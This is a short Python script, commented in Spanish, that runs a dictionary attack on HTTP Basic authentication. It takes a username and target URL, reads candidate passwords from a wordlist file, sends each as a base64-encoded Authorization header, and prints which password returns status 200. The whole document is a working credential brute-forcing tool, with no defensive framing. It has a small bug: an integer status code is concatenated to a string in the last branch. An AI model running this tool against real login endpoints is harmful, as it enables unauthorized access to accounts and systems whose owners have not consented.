import requests, base64


user = input('Escribe tu nombre de usuario: \r\n')
url = input('Inserta la URL en formato "http://PATH":\r\n')

peticion = requests.get(url=url) 
creds = peticion

diccionario = open(file='PATH_TO_DICT') # Inserte el PATH al archivo del diccionario.
for palabra in diccionario:

    password = (user+":"+palabra.rstrip("\n")).encode('utf-8') #Eliminamos el salto de línea que se da al iterar sobre las palabras
    enc_password = base64.b64encode(password).decode('utf-8')  #del diccionario
    cabecera = 'Basic '+enc_password
   
    
    headers = {'Authorization' : cabecera} # La cabecera "Authorization" se puede editar y sobreescribir 

    creds = requests.get(url=url, headers=headers)

    if creds.status_code == 200:
        print(f'Acceso con usuario \033[1;32m{user}\033[0;37m y contraseña \033[1;32m{palabra}')
        break
        
    elif creds.status_code == 401:
        print(f'Error con usuario \033[1;32m{user}\033[0;37m y contraseña \033[1;31m{palabra}\033[0;37m')
        
    else:
        print('Código de estado ' + creds.status_code + ' inesperado')
